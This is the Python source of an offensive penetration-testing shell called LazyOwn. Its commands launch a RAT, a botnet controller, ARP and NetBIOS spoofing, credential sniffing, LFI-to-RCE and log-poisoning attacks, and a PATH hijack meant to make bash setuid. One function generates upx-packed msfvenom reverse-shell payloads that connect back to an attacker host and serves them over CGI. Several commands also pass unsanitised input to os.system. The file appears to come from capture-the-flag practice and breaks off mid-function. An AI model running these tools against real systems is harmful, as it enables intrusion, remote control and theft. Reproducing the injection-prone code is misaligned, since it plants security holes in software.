#!/usr/bin/env python3
# _*_ coding: utf8 _*_
"""
main.py

Autor: Gris Iscomeback
Correo electrónico: grisiscomeback[at]gmail[dot]com
Fecha de creación: 09/06/2024
Licencia: GPL v3

Descripción: Este archivo contiene la definición de las rutas y la lógica de la aplicación de Terminal.
LazyOwn Framework SHELL

██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║
██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║
██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║
███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║
╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝

"""

import os
import sys
import subprocess
import shlex
import signal
import json
from cmd import Cmd

BANNER = """

 ██▓    ▄▄▄      ▒███████▒▓██   ██▓ ▒█████   █     █░███▄    █                
▓██▒   ▒████▄    ▒ ▒ ▒ ▄▀░ ▒██  ██▒▒██▒  ██▒▓█░ █ ░█░██ ▀█   █                
▒██░   ▒██  ▀█▄  ░ ▒ ▄▀▒░   ▒██ ██░▒██░  ██▒▒█░ █ ░█▓██  ▀█ ██▒               
▒██░   ░██▄▄▄▄██   ▄▀▒   ░  ░ ▐██▓░▒██   ██░░█░ █ ░█▓██▒  ▐▌██▒               
░██████▒▓█   ▓██▒▒███████▒  ░ ██▒▓░░ ████▓▒░░░██▒██▓▒██░   ▓██░               
░ ▒░▓  ░▒▒   ▓▒█░░▒▒ ▓░▒░▒   ██▒▒▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒ ░ ▒░   ▒ ▒                
░ ░ ▒  ░ ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▓██ ░▒░   ░ ▒ ▒░   ▒ ░ ░ ░ ░░   ░ ▒░               
  ░ ░    ░   ▒   ░ ░ ░ ░ ░ ▒ ▒ ░░  ░ ░ ░ ▒    ░   ░    ░   ░ ░                
    ░  ░     ░  ░  ░ ░     ░ ░         ░ ░      ░            ░                
                 ░         ░ ░                                                
  █████▒██▀███   ▄▄▄       ███▄ ▄███▓▓█████  █     █░ ▒█████   ██▀███   ██ ▄█▀
▓██   ▒▓██ ▒ ██▒▒████▄    ▓██▒▀█▀ ██▒▓█   ▀ ▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒ ██▄█▒ 
▒████ ░▓██ ░▄█ ▒▒██  ▀█▄  ▓██    ▓██░▒███   ▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒▓███▄░ 
░▓█▒  ░▒██▀▀█▄  ░██▄▄▄▄██ ▒██    ▒██ ▒▓█  ▄ ░█░ █ ░█ ▒██   ██░▒██▀▀█▄  ▓██ █▄ 
░▒█░   ░██▓ ▒██▒ ▓█   ▓██▒▒██▒   ░██▒░▒████▒░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒▒██▒ █▄
 ▒ ░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ░  ░░░ ▒░ ░░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░▒ ▒▒ ▓▒
 ░       ░▒ ░ ▒░  ▒   ▒▒ ░░  ░      ░ ░ ░  ░  ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░░ ░▒ ▒░
 ░ ░     ░░   ░   ░   ▒   ░      ░      ░     ░   ░  ░ ░ ░ ▒    ░░   ░ ░ ░░ ░ 
          ░           ░  ░       ░      ░  ░    ░        ░ ░     ░     ░  ░   
[*] Iniciando: Framework [;,;] """

version = "v0.0.12"
# Definimos algunos códigos de escape ANSI para colores
RESET = "\033[0m"
BOLD = "\033[1m"
UNDERLINE = "\033[4m"

# Colores de texto
BLACK = "\033[30m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"

# Colores de fondo
BG_BLACK = "\033[40m"
BG_RED = "\033[41m"
BG_GREEN = "\033[42m"
BG_YELLOW = "\033[43m"
BG_BLUE = "\033[44m"
BG_MAGENTA = "\033[45m"
BG_CYAN = "\033[46m"
BG_WHITE = "\033[47m"

print(f"{BG_BLACK}{RED}{BANNER}{MAGENTA}Autor: {CYAN}grisUN0{RESET}")

def signal_handler(sig, frame):
    global should_exit
    print(f"\n {RED}[<-]{YELLOW} para salir usar el comando{GREEN} exit o q ...{RESET}")
    should_exit = True
    return


signal.signal(signal.SIGINT, signal_handler)


def is_binary_present(binary_name):
    result = os.system(f"which {binary_name} > /dev/null 2>&1")
    return result == 0

def activate_virtualenv(venv_path):
    # Ejecutar el shell interactivo con el entorno virtual activado
    process = subprocess.Popen(
        ["bash", "-c", f"source {venv_path}/bin/activate && exec bash"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    # Captura la salida del proceso hijo
    stdout, stderr = process.communicate()
    print(f"{GREEN}[+] Entorno Activado.{RESET}")

class LazyOwnShell(Cmd):
    prompt = "LazyOwn> "
    intro = f"""{YELLOW}[*] Welcome to the LazyOwn Framework [;,;] {BLUE}{version} {WHITE}interactive shell! Type ? to list commands{BLUE}
{GREEN}[+] Github:{BLUE} https://github.com/grisuno/LazyOwn
{GREEN}[+] Web:{BLUE} https://grisuno.github.io/LazyOwn/
{GREEN}[+] Reddit:{BLUE} https://www.reddit.com/r/LazyOwn/
{GREEN}[+] Facebook:{BLUE} https://web.facebook.com/profile.php?id=61560596232150
{GREEN}[+] hackTheBox:{BLUE} https://app.hackthebox.com/teams/overview/6429 {RESET}
"""
    # Diccionario para almacenar alias
    aliases = {
        'ls': 'list',
        'nmap': 'run lazynmap',
        'q': 'exit',
        'p': 'payload',
        'sniff': 'run lazysniff',
        'ftpsniff': 'run lazyftpsniff',
    }
    os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"[\033[96m\" iface\"\033[0m] \"a[1] }'")

    def __init__(self):
        super().__init__()
        self.params = {
            "binary_name": "gzip",
            "api_key": None,
            "prompt": None,
            "url": None,
            "method": "GET",
            "headers": "{}",
            "params": "{}",
            "data": "{}",
            "json_data": "{}",
            "proxy_port": 8080,
            "wordlist": None,
            "hide_code": None,
            "mode": None,
            "reverse_shell_port": None,     
            "path": "/",
            "rhost": None,
            "lhost": None,
            "rport": 1337,
            "lport": 1337,
            "rat_key": "82e672ae054aa4de6f042c888111686a",
            "startip": "192.168.1.1",
            "endip": "192.168.1.254",
            "spoof_ip": "185.199.110.153",
            "device": "eth0",
            "email_from": "email@gmail.com",
            "email_to": "email@gmail.com",
            "email_username": "email@gmail.com",
            "email_password": "pa$$w0rd",
            "smtp_server": "smtp.server.com",
            "smtp_port": "587",
            "field": "page",
            "headers_file": None,
            "data_file": None,
            "params_file": None,
            "json_data_file": None,
            "exploitdb": "/usr/share/exploitdb/exploits/",
            "dirwordlist": "/usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt",
            "usrwordlist": "/usr/share/wordlists/SecLists-master/Usernames/xato-net-10-million-usernames.txt",
            "dnswordlist": "/usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt",
        }
        self.scripts = [
            "lazysearch",
            "lazysearch_gui",
            "lazyown",
            "update_db",
            "lazynmap",
            "lazyaslrcheck",
            "lazynmapdiscovery",
            "lazygptcli",
            "lazyburpfuzzer",
            "lazymetaextract0r",
            "lazyreverse_shell",
            "lazyattack",
            "lazyownratcli",
            "lazyownrat",
            "lazygath",
            "lazysniff",
            "lazynetbios",
            "lazybotnet",
            "lazybotcli",
            "lazyhoneypot",
            "lazysearch_bot",
            "lazylfi2rce",
            "lazylogpoisoning",
            "lazymsfvenom",
            "lazypathhijacking",
            "lazyarpspoofing",
            "lazyftpsniff",
            "lazyssh77enum",
            "lazywerkzeugdebug",
        ]
        self.output = ""

    def default(self, line):
        """Handle undefined commands (including aliases)."""
        # Obtener el comando o alias
        command = self.aliases.get(line, line)
        
        # Separar el comando y los argumentos si existe
        parts = command.split(maxsplit=1)
        cmd_name = parts[0]
        cmd_args = parts[1] if len(parts) > 1 else ''
        
        # Ejecutar el comando si existe
        method_name = f'do_{cmd_name}'
        if hasattr(self, method_name):
            return getattr(self, method_name)(cmd_args)
        else:
            print(f"{GREEN}[?] {YELLOW} Not Found {BLUE}{line}{RESET}")

    def one_cmd(self, command):
        self.output = self.get_output
        try:
            self.onecmd(command)  # Ejecuta el comando directamente
            self.output = "Command executed successfully."
            return self.output
        except Exception as e:
            self.output = str(e)

    def do_set(self, line):
        """Set a parameter value. Usage: set <parameter> <value>"""
        args = shlex.split(line)
        if len(args) != 2:
            print(f"{YELLOW}[?] Usage: set <parameter> <value>{RESET}")
            return

        param, value = args
        if param in self.params:
            self.params[param] = value
            print(f"{GREEN}[SET] {YELLOW}{param} set to {GREEN}{value} {RESET}")
        else:
            print(f"{RED}[?] Unknown parameter: {param}{RESET}")

    def do_show(self, line):
        """Show the current parameter values"""
        for param, value in self.params.items():
            print(f"{param}: {value}")

    def do_list(self, line):
        """List all available scripts in modules directory, they can use apart from the framework too."""
        scripts = self.scripts
        num_columns = 3
        
        if not scripts:
            print(f"{RED}[-]No available scripts.{RESET}")
            return
        
        # Calcular el ancho máximo para cada columna
        max_len = max(len(script) for script in scripts)
        column_width = max_len + 2  # Añadir un poco de espacio extra para separación

        # Crear el formato de cada línea en columnas
        rows = [scripts[i:i + num_columns] for i in range(0, len(scripts), num_columns)]
        
        # Mostrar los resultados en columnas
        print(f"{GREEN}[+]{YELLOW}Available scripts to run:{RESET}\n")
        for row in rows:
            # Crear una fila con los elementos ajustados al ancho de columna
            print(f"".join(f"{script.ljust(column_width)}{RESET}" for script in row))

    def do_run(self, line):
        """Run a specific LazyOwn script to see all scripts to run see: list or help list"""
        args = shlex.split(line)
        if not args:
            print(f"{YELLOW}[?] Usage: {GREEN} run <script_name> {RESET}")
            return

        script_name = args[0]
        if script_name in self.scripts:
            getattr(self, f"run_{script_name}")()
        else:
            print(f"{YELLOW}[?] Unknown script: {RED}{script_name}{RESET}")

    def run_lazysearch(self):
        binary_name = self.params["binary_name"]
        if not binary_name:
            print("[?] binary_name not set")
            return
        self.run_script("modules/lazysearch.py", binary_name)

    def run_lazysearch_gui(self):
        self.run_script("modules/LazyOwnExplorer.py")

    def run_lazyown(self):
        self.run_script("modules/lazyown.py")

    def run_update_db(self):
        os.system("./modules/update_db.sh")

    def run_lazynmap(self):
        path = os.getcwd()
        target_ip = self.params["rhost"]
        if not target_ip:
            print(f"{RED}[?]{YELLOW} rhost must be set, {GREEN}help set to more info {RESET}")
            return
        os.system(f"{path}/modules/lazynmap.sh -t {target_ip}")

    def run_lazywerkzeugdebug(self):
        """test werkzeug in debugmode"""
        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        rport = self.params["rport"]
        lport = self.params["lport"]
        if not rhost or not lhost or not lport or not rport:
            print(
                "rhost, lhost, rpor, and lport must be set, to more info see: help set"
            )
            return
        self.run_script("modules/lazywerkzeug.py", rhost, rport, lhost, lport)
        return

    def run_lazygath(self):
        path = os.getcwd()
        os.system(f"sudo {path}/modules/lazygat.sh")

    def run_lazynmapdiscovery(self):
        path = os.getcwd()
        os.system(f"{path}/modules/lazynmap.sh -d")

    def run_lazysniff(self):
        env = os.environ.copy()
        env["LANG"] = "en_US.UTF-8"
        env["TERM"] = "xterm-256color"
        device = self.params["device"]
        subprocess.run(
            ["python3", "modules/lazysniff.py", "-i", device],
            env=env,
            stdin=sys.stdin,
            stdout=sys.stdout,
            stderr=sys.stderr,
        )

    def run_lazyftpsniff(self):
        device = self.params["device"]
        env = os.environ.copy()
        env["LANG"] = "en_US.UTF-8"
        env["TERM"] = "xterm-256color"
        if not device:
            print("device must be set to choice the interface")
            return
        subprocess.run(["python3", "modules/lazyftpsniff.py", "-i", device])

    def run_lazynetbios(self):
        startip = self.params["startip"]
        endip = self.params["endip"]
        spoof_ip = self.params["spoof_ip"]
        subprocess.run(["python3", "modules/lazynetbios.py", startip, endip, spoof_ip])

    def run_lazyhoneypot(self):
        email_from = self.params["email_from"]
        email_to = self.params["email_to"]
        email_username = self.params["email_username"]
        email_password = self.params["email_password"]
        self.run_script(
            "modules/lazyhoneypot.py",
            "--email_from",
            email_from,
            "--email_to",
            email_to,
            "--email_username",
            email_username,
            "--email_password",
            email_password,
        )

    def run_lazygptcli(self):
        prompt = self.params["prompt"]
        api_key = self.params["api_key"]
        if not prompt or not api_key:
            print("[?] prompt and api_key must be set")
            return
        os.environ["GROQ_API_KEY"] = api_key
        self.run_script("modules/lazygptcli.py", "--prompt", prompt)

    def run_lazysearch_bot(self):
        prompt = self.params["prompt"]
        api_key = self.params["api_key"]
        if not prompt or not api_key:
            print("[?] prompt and api_key must be set")
            return
        os.environ["GROQ_API_KEY"] = api_key
        self.run_script("modules/lazysearch_bot.py", "--prompt", prompt)

    def run_lazymetaextract0r(self):
        path = self.params["path"]
        if not path:
            print("[?] path must be set")
            return
        self.run_script("modules/lazyown_metaextract0r.py", "--path", path)

    def run_lazyownratcli(self):
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        rat_key = self.params["rat_key"]
        if not lhost or not lport or not rat_key:
            print("[?] lhost and lport and rat_key must be set")
            return
        self.run_script(
            "modules/lazyownclient.py",
            "--host",
            lhost,
            "--port",
            str(lport),
            "--key",
            rat_key,
        )

    def run_lazyownrat(self):
        rhost = self.params["rhost"]
        rport = self.params["rport"]
        rat_key = self.params["rat_key"]
        if not rhost or not rport or not rat_key:
            print("[?] rhost and lport and rat_key must be set")
            return
        self.run_script(
            "modules/lazyownserver.py",
            "--host",
            rhost,
            "--port",
            str(rport),
            "--key",
            rat_key,
        )

    def run_lazybotnet(self):
        rhost = "0.0.0.0"
        rport = self.params["rport"]
        rat_key = self.params["rat_key"]
        if not rhost or not rport or not rat_key:
            print("[?] rhost and lport and rat_key must be set")
            return
        self.run_script(
            "modules/lazybotnet.py",
            "--host",
            rhost,
            "--port",
            str(rport),
            "--key",
            rat_key,
        )

    def run_lazylfi2rce(self):
        rhost = self.params["rhost"]
        rport = self.params["rport"]
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        field = self.params["field"]
        wordlist = self.params["wordlist"]

        if (
            not rhost
            or not rport
            or not lhost
            or not lport
            or not field
            or not wordlist
        ):
            print("[?] rhost and rport field and lhost lport wordlist must be set")
            return
        self.run_script(
            "modules/lazylfi2rce.py",
            "--rhost",
            rhost,
            "--rport",
            str(rport),
            "--lhost",
            lhost,
            "--lport",
            str(lport),
            "--field",
            field,
            "--wordlist",
            wordlist,
        )

    def run_lazylogpoisoning(self):
        rhost = self.params["rhost"]
        lhost = self.params["lhost"]

        if not rhost or not lhost:
            print("[?] rhost and lhost must be set")
            return
        self.run_script(
            "modules/lazylogpoisoning.py", "--rhost", rhost, "--lhost", lhost
        )

    def run_lazybotcli(self):
        rhost = "0.0.0.0"
        rport = self.params["rport"]
        rat_key = self.params["rat_key"]
        if not rhost or not rport or not rat_key:
            print("[?] rhost and lport and rat_key must be set")
            return
        self.run_script(
            "modules/lazybotcli.py",
            "--host",
            rhost,
            "--port",
            str(rport),
            "--key",
            rat_key,
        )

    def run_lazyssh77enum(self):
        wordlist = self.params["usrwordlist"]
        rhost = self.params["rhost"]
        if not wordlist or not rhost:
            print("rhost and wordlist must be set")
            return
        print(
            "[?] this may not be accurate. using a version a little bit updated from searchsploit"
        )
        path = os.getcwd()
        os.system(f"{path}/modules/lazybrutesshuserenum.sh {wordlist} {rhost}")

    def run_lazyburpfuzzer(self):
        url = self.params["url"]
        method = self.params["method"]
        headers = self.params["headers"]
        params = self.params["params"]
        data = self.params["data"]
        json_data = self.params["json_data"]
        proxy_port = self.params["proxy_port"]
        wordlist = self.params["wordlist"]
        hide_code = self.params["hide_code"]
        headers_file = self.params.get("headers_file")
        data_file = self.params.get("data_file")
        params_file = self.params.get("params_file")
        json_data_file = self.params.get("json_data_file")

        command = [
            "python3",
            "modules/lazyown_bprfuzzer.py",
            "--url",
            url,
            "--method",
            method,
            "--proxy_port",
            str(proxy_port),
        ]

        if headers_file:
            command.extend(["--headers_file", headers_file])
        else:
            command.extend(["--headers", headers])

        if data_file:
            command.extend(["--data_file", data_file])
        else:
            command.extend(["--data", data])

        if params_file:
            command.extend(["--params_file", params_file])
        else:
            command.extend(["--params", params])

        if json_data_file:
            command.extend(["--json_data_file", json_data_file])
        else:
            command.extend(["--json_data", json_data])

        if wordlist:
            command.extend(["-w", wordlist])
        if hide_code:
            command.extend(["-hc", str(hide_code)])

        self.run_command(command)

    def run_lazyreverse_shell(self):
        ip = self.params["rhost"]
        port = self.params["reverse_shell_port"]
        path = os.getcwd()
        if not ip or not port:
            print(
                "[?] rhost and reverse_shell_port must be set, more info see, help set"
            )
            return
        os.system(f"{path}/modules/lazyreverse_shell.sh --ip {ip} --puerto {port}")

    def run_lazyarpspoofing(self):
        lhost = self.params["lhost"]
        rhost = self.params["rhost"]
        device = self.params["device"]
        if not lhost or not rhost or not device:
            print("[?] lhost, lhost, and device must be set")
            return
        os.system(f"modules/lazyarpspoofing.py --device {device} {lhost} {rhost}")

    def run_lazyattack(self):
        path = os.getcwd()
        mode = self.params["mode"]
        target_ip = self.params["rhost"]
        attacker_ip = self.params["lhost"]
        if not mode or not target_ip or not attacker_ip:
            print("[?] mode, rhost, and lhost must be set, more info see help set")
            return
        os.system(
            f"{path}/modules/lazyatack.sh --modo {mode} --ip {target_ip} --atacante {attacker_ip}"
        )

    def run_lazymsfvenom(self):
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        path = os.getcwd()
        if not lhost or not lport:
            print("[?] lport and lhost mus be set")
            return
        os.system(
            f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell.elf'
        )
        os.system(
            f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell.exe'
        )
        os.system(
            f'msfvenom -p osx/x86/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell.macho'
        )
        result = subprocess.getoutput(
            f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f python -b '\x80\x0a\x0d'"
        )
        print(f"[*] LHOST={lhost} LPORT={lport}")
        print(result)
        os.system("mv shell.* modules/cgi-bin")
        os.system("chmod +x modules/cgi-bin/*")
        print("[*] Lazy MSFVenom Reverse_shell payloads in modules/cgi-bin/ ")
        print("[*] upx to bins to smaller bins")
        os.system("upx modules/cgi-bin/shell.elf")
        os.system("upx modules/cgi-bin/shell.macho")
        os.system("upx modules/cgi-bin/shell.exe")
        print("[?] To run web server exec command: lazywebshell [;,;] ")

    def run_lazyaslrcheck(self):
        print(
            "[+] Attemp to cat /proc/sys/kernel/randomize_va_space to ksnow if ASLR is active"
        )
        result = subprocess.getoutput("cat /proc/sys/kernel/randomize_va_space")
        print(result)
        if result == "0":
            print("[+] ASLR is deactivated")
        elif result == "1":
            print("[+] ASLR is partial activated")
        elif result == "2":
            print("[+] ASLR is activated")

    def run_lazypathhijacking(self):
        binary_name = self.params["binary_name"]
        if not binary_name:
            print("[?] binary_name must be set")
            return
        os.system(f"echo {binary_name} >> modules/tmp.sh")
        os.system(f"cp modules/tmp.sh /tmp/{binary_name}")
        os.system(f"chmod +x /tmp/{binary_name}")
        os.system("export PATH=/tmp:$PATH")
        print(
            f"[*] Lazy path hijacking with binary_name: {binary_name} to set u+s to /bin/bash"
        )

    def run_script(self, script_name, *args):
        """Run a script with the given arguments"""
        command = ["python3", script_name] + [str(arg) for arg in args]
        self.run_command(command)

    def run_command(self, command):
        """Run a command and print output in real-time"""
        process = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        try:
            for line in iter(process.stdout.readline, ""):
                self.output += line  # Agregar la salida a la variable self.output
                print(line, end="")
            for line in iter(process.stderr.readline, ""):
                self.output += line  # Agregar la salida de stderr también
                print(line, end="")
            process.stdout.close()
            process.stderr.close()
            process.wait()
        except KeyboardInterrupt:
            process.terminate()
            process.wait()
            print("\n[Interrupted] Process terminated")

    def do_payload(self, line):
        """Load parameters from payload.json"""
        try:
            with open("payload.json", "r") as f:
                data = json.load(f)
            for key, value in data.items():
                if key in self.params:
                    self.params[key] = value
            print(f"{YELLOW}[*] Parameters loaded from{GREEN} payload.json{RESET}")
        except FileNotFoundError:
            print("[?] payload.json not found")
        except json.JSONDecodeError:
            print("[?] Error decoding payload.json")

    def do_exit(self, arg):
        """Exit the command line interface."""
        # Si deseas, puedes implementar confirmación aquí
        confirm = input(f"{YELLOW}[?] ¿Seguro que quieres salir? {GREEN}(y/n): {RESET}").strip().lower()
        if confirm == 'y':
            print(f'{RED}[->] Saliendo ...{RESET}')
            sys.exit(0)
        else:
            print(f'{RED}[->] Salida Cancelada .{RESET}')
            return False

    def do_fixperm(self, line):
        """Fix Perm LazyOwn shell"""
        print("[f] Fix script perm")
        os.system("chmod +x modules/*.sh")
        os.system("chmod +x modules/cgi-bin/*")
        return

    def do_lazywebshell(self, line):
        """LazyOwn shell"""
        print("[r] Running Server in localhost:8888/cgi-bin/lazywebshell.py")
        os.system("cd modules && python3 -m http.server 8888 --cgi &")
        return

    def do_getcap(self, line):
        """try get capabilities :)"""
        print(f"{YELLOW}[+] Try get capabilities {RESET}")
        os.system("getcap -r / 2>/dev/null")
        return

    def do_getseclist(self, line):
        """get seclist :D"""
        print(f"{YELLOW}[+] Try to get seclist wordlist [;,;] {RESET}")
        os.system("""cd /usr/share/wordlists/ && sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip \
        && sudo unzip SecList.zip \
        && sudo  rm -f SecList.zip""")

    def do_smbclient(self, line):
        """Lazy SMBCLient"""
        if not self.params["rhost"]:
            print("[?] rhost must be set")
            return
        rhost = self.params["rhost"]
        if line:
            print(f"{YELLOW}[*] Try .. smbclient -N \\\\{rhost}\\\\{line} {RESET}")
            os.system(f"smbclient -N \\\\\\\\{rhost}\\\\{line}")
            return
        print(f"{GREEN}[*] perform this command: smbclient -N -L \\\\{rhost}\\ {RESET}")
        os.system(f"smbclient -N -L \\\\{rhost}\\")

    def do_smbmap(self, line):
        """smbmap -H 10.10.10.3 [OPTIONS]"""
        rhost = self.params["rhost"]
        if not rhost:
            print("rhost must be set, see help set, ex: set rhost 10.10.10.3 ")
            return
        if not line:
            print(f"[*] try... smbmap -H {rhost} -u 'deefbeef'")
            os.system(f"smbmap -H {rhost} -u 'deefbeef'")
            return
        print(f"[*] try... smbmap -H {rhost} -R {line}")
        os.system(f"smbmap -H {rhost} -R {line}")

    def do_psexec(self, line):
        """Lazy impacket-psexec administrator@"""
        if not self.params["rhost"]:
            print("[?] rhost must be set")
            return
        rhost = self.params["rhost"]
        os.system(f"impacket-psexec administrator@{rhost}")

    def do_rpcdump(self, line):
        """rpcdump.py -p 135 10.10.11.24"""
        rhost = self.params["rhost"]
        if not rhost:
            print("rhost must be set more info see help set, or help <TOPIC> ")
            return
        print(f"[+] Try... rpcdump.py -p 135 {rhost}")
        os.system(f"rpcdump.py -p 135 {rhost}")
        print(f"[+] Try... rpcdump.py -p 593 {rhost}")
        os.system(f"rpcdump.py -p 593 {rhost}")
        return

    def do_dig(self, line):
        """dig version.bind CHAOS TXT @DNS"""
        rhost = self.params["rhost"]
        if not line or not rhost:
            print(
                "rhost must be set or you must pass the dns argument like dig box.htb"
            )
            return
        print(f"[+] Try dig version.bind CHAOS TXT @{line}")
        os.system(f"dig version.bind CHAOS TXT @{line}")
        print(f"dig any {line} @{rhost}")
        os.system(f"dig any {line} @{rhost}")
        return

    def do_cp(self, line):
        """cp {exploitdb}DNS"""
        exploitdb = self.params["exploitdb"]
        path = os.getcwd()
        if not line or not exploitdb:
            print(
                "exploitdb must be set, use set exploitdb /usr/share/exploitdb/exploits/ or pass the relative directory path show in the ss alias of command searchsploit, like cp java/remote/51884.py to see the ralive path use ex: ss TeamCity -x java/remote/51884.py"
            )
            return
        print(f"[+] Try cp {exploitdb}{line} {path}/sessions/")
        os.system(f"cp {exploitdb}{line} {path}/sessions/")

        return

    def do_dnsenum(self, line):
        """dnsenum --dnsserver 10.10.11.24 --enum -p 0 -s 0 -o sessions/subdomains.txt -f {dnswordlist} ghost.htb"""
        rhost = self.params["rhost"]
        dnswordlist = self.params["dnswordlist"]
        if not line or not rhost or not dnswordlist:
            print("rhost and dnswordlist must be set example: set rhost 10.10.10.10 or you need pass the domain ")
            return
        print(
            f"[+] Try ... dnsenum --dnsserver {rhost} --enum -p 0 -s 0 -o sessions/subdomains.txt -f {dnswordlist} {line}"
        )
        os.system(
            f"dnsenum --dnsserver {rhost} --enum -p 0 -s 0 -o sessions/subdomains.txt -f {dnswordlist} {line}"
        )
        return

    def do_dnsmap(self, line):
        """dnsmap --dnsserver 10.10.11.24 --enum -p 0 -s 0 -o sessions/subdomains.txt -f {dnswordlist} ghost.htb"""
        rhost = self.params["rhost"]
        dnswordlist = self.params["dnswordlist"]
        if not line or not dnswordlist:
            print("dnswordlist must be set example: set dnswordlist path/to/wordlist or you need pass the domain ")
            return
        print(
            f"[+] Try ... dnsmap {line} -w {dnswordlist}"
        )
        os.system(
            f"dnsmap {line} -w {dnswordlist}"
        )
        return

    def do_whatweb(self, line):
        """whatweb"""
        if not self.params["rhost"]:
            print("[?] rhost must be set")
            return
        rhost = self.params["rhost"]
        print(f"try whatweb {rhost}")
        os.system(f"whatweb {rhost}")

    def do_enum4linux(self, line):
        """enum4linux -a target"""
        if not self.params["rhost"]:
            print("[?] rhost must be set")
            return
        rhost = self.params["rhost"]
        print(f"try enum4linux -a {rhost}")
        os.system(f"enum4linux -a {rhost}")
        return

    def do_nbtscan(self, line):
        """sudo nbtscan -r target"""
        if not self.params["rhost"]:
            print("[?] rhost must be set")
            return
        rhost = self.params["rhost"]
        print(f"try sudo nbtscan -r {rhost}/24")
        os.system(f"sudo nbtscan -r {rhost}/24")
        return

    def do_rpcclient(self, line):
        """rpcclient -U "" -N 10.10.10.10"""
        if not self.params["rhost"]:
            print("[?] rhost must be set")
            return
        rhost = self.params["rhost"]
        print(f"try rpcclient -U '' -N {rhost}")
        os.system(f"rpcclient -U '' -N {rhost}")
        return

    def do_nikto(self, line):
        """nikto -h 10.10.10.10"""
        if not self.params["rhost"]:
            print("[?] rhost must be set")
            return
        rhost = self.params["rhost"]
        print(f"try nikto -h {rhost}")
        os.system(f"nikto -h {rhost}")
        return

    def do_openssl_sclient(self, line):
        """openssl s_client -connect  10.10.10.10"""
        if not self.params["rhost"] or not line:
            print("[?] rhost must be set and you need pass the port by argument ex: openssl_sckient 443")
            return
        rhost = self.params["rhost"]
        print(f"try openssl s_client -connect  {rhost}:{line}")
        os.system(f"openssl s_client -connect  {rhost}:{line}")
        return

    def do_ss(self, line):
        """searchsploit alias"""
        print("[+] searching in searchsploit")
        os.system(f"searchsploit {line}")

    def do_wfuzz(self, line):
        """lazy alias to wfuzz"""
        dirwordlist = self.params["dirwordlist"]
        rhost = self.params["rhost"]
        if not rhost or not dirwordlist:
            print("dirwordlist and rhost must be set")
            return
        if line:
            if line.startswith("sub"):
                params = line.split(' ')
                count = len(params)
                arg1 = params[0]
                domain = params[1]
                if count > 2:
                    arg3 = params[2]
                else:
                    arg3 = ""
                print(f"[*] Try ...  wfuzz -c {arg3} -t 200 -w {dirwordlist} -H 'Host: FUZZ.{domain}' {domain}")
                os.system(f"wfuzz -c {arg3} -t 200 -w {dirwordlist} -H 'Host: FUZZ.{domain}' {domain}")
                return
        print(f"[*]Try ... wfuzz -c {line} -t 200 -w {dirwordlist} http://{rhost}/FUZZ")
        os.system(f"wfuzz -c {line} -t 200 -w {dirwordlist} http://{rhost}/FUZZ")
        return

    def do_gobuster(self, line):
        """Lazy gobuster"""
        dirwordlist = self.params["dirwordlist"]
        rhost = self.params["rhost"]
        if not rhost or not dirwordlist:
            print("rhost and dirwordlist must be set")
            return
        if line == "url":
            url = self.params["url"]
            if not url:
                print("[?] url must be set, ex: set url http://domain.ext")
                return
            print(f"[+] Try gobuster dir --url {url}/ --wordlist {dirwordlist}")
            os.system(f"gobuster dir --url {url}/ --wordlist {dirwordlist}")
            return
        print(
            f"[+] Try... gobuster dir --url http://{rhost}/ --wordlist {dirwordlist} {line}"
        )
        os.system(f"gobuster dir --url http://{rhost}/ --wordlist {dirwordlist} {line}")
        return

    def do_addhosts(self, line):
        """sudo -- sh -c -e "echo '10.10.11.23 permx.htb' >> /etc/hosts;"""
        rhost = self.params["rhost"]
        if not rhost or not line:
            print(
                "add domain and rhost must be set to more info see help set (set rhost 10.10.10.10) ex: addhost domain.ext"
            )
            return
        print(f"[+] Try... sudo -- sh -c -e \"echo '{rhost} {line}' >> /etc/hosts\";")
        os.system(f"sudo -- sh -c -e \"echo '{rhost} {line}' >> /etc/hosts\";")
        print(f"[*] Done... add {line} to /etc/hosts ")
        return

    def do_cme(self, line):
        """crackmapexec smb 10.10.11.24"""
        rhost = self.params["rhost"]
        if not rhost:
            print(
                "add domain and rhost must be set to more info see help set (set rhost 10.10.10.10) ex: addhost domain.ext"
            )
            return
        print(f"[+] Try... crackmapexec smb {rhost}")
        os.system(f"crackmapexec smb {rhost}")
        print(f"[*] Done... crackmapexec smb {rhost}")
        return

    def do_ping(self, line):
